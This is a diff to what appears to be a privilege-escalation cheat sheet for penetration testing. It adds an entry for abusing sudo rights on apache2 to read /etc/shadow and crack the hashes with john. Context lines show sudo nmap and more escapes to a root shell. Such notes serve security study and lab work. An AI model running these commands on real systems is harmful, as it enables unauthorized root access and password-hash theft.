@@ -316,6 +316,13 @@ echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
 TERM= sudo -E more /etc/profile
 !/bin/bash
 ````
+#### Apache2
+````
+sudo -l 
+(root) NOPASSWD: /usr/sbin/apache2
+sudo apache2 -f /etc/shadow
+````
+- Copy hash to attacker box and crack with john
 ### Sudo Environment Variables
 - Sudo can be configured to inherit certain environment variables from the user's environment.
 - Check which environment variables are inherited (look for the env_keep options):
